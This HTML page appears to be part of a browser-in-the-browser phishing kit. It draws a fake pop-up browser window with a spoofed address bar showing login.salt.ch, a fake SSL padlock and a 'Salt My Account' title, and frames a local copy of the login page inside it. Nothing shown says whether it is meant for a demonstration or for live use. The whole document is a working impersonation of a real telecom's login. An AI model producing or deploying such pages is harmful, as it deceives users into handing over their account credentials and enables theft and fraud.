<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
<div id="window">
<!-- Title bar start -->
<div id="title-bar-width">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="./apple-touch-icon.png" width="15px" height="15px" id="logo">
			<span id="logo-description">Salt My Account</span>
		</div>

		<div>
			<span id="minimize">&#8212;</span>
			<span id="square">□</span>
			<span id="exit">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">login.salt.ch</span>
		<span id="domain-path">/cas-external/login?service=https%3A//my.salt.ch/&lang=fr</span>
	</div>
</div>
<!-- Content start -->
<iframe id="content" src="salt.html" frameBorder="0"></iframe>
</div>
</body>
<script src="script.js"></script>
</html>
